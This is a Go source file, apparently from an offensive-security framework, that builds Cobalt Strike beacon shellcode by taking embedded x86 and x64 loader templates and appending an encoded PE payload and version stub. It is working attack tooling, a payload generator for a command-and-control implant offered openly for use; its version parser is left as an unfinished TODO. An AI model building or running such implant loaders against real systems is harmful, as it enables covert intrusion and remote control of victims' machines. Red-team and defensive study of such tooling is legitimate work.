package beacon

import (
	"bytes"
	"embed"
	"encoding/binary"
	"fmt"

	"github.com/RTS-Framework/GRT-Develop/argument"
	"github.com/RTS-Framework/GRT-Develop/instance"
	"github.com/RTS-Framework/GRT-MXLoader/loader"
)

// just for prevent [import _ "embed"] :)
var _ embed.FS

var (
	//go:embed template/CS_Beacon_x86.bin
	defaultTemplateX86 []byte

	//go:embed template/CS_Beacon_x64.bin
	defaultTemplateX64 []byte
)

// Options contains options about create instance.
type Options struct {
	// set the custom loader template, it only lacked argument stub.
	Template []byte `toml:"template" json:"template"`

	// specify the version of the Cobalt-Strike, default is the 4.0
	Version string `toml:"version" json:"version"`

	// ignore instantiate options about runtime.
	IgnoreInstOpts bool `toml:"ignore_runtime_opts" json:"ignore_runtime_opts"`

	// set instantiate options about runtime.
	Runtime instance.Options `toml:"runtime" json:"runtime"`
}

// CreateInstance is used to create instance from PE Loader template.
func CreateInstance(arch string, image loader.Payload, opts *Options) ([]byte, error) {
	if opts == nil {
		opts = new(Options)
	}
	// parse and encode version
	version, err := encodeVersion(opts.Version)
	if err != nil {
		return nil, fmt.Errorf("failed to encode version: %s", err)
	}
	// encode image
	peImage, err := image.Encode()
	if err != nil {
		return nil, fmt.Errorf("invalid %s mode config: %s", image.Mode(), err)
	}
	// select loader template
	var defaultTemplate []byte
	switch arch {
	case "386":
		defaultTemplate = defaultTemplateX86
	case "amd64":
		defaultTemplate = defaultTemplateX64
	default:
		return nil, fmt.Errorf("invalid architecture: %s", arch)
	}
	template := opts.Template
	if template == nil {
		template = defaultTemplate
	}
	// create instance
	inst, err := instantiateFromTemplate(opts, template)
	if err != nil {
		return nil, err
	}
	// encode arguments at tail of instance
	args := []*argument.Arg{
		{ID: 1, Data: version},
		{ID: 2, Data: peImage},
	}
	stub, err := argument.Encode(args...)
	if err != nil {
		return nil, fmt.Errorf("failed to encode argument: %s", err)
	}
	return append(inst, stub...), nil
}

func encodeVersion(version string) ([]byte, error) {
	var ver uint32
	if version != "" {
		// TODO
	} else {
		ver = 0x0400 // v4.0
	}

	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, ver)
	return buf, nil
}

func instantiateFromTemplate(opts *Options, template []byte) ([]byte, error) {
	if opts.IgnoreInstOpts {
		return bytes.Clone(template), nil
	}
	instOpts := opts.Runtime
	instOpts.SkipArguments = true
	return instance.Instantiate(template, &instOpts)
}
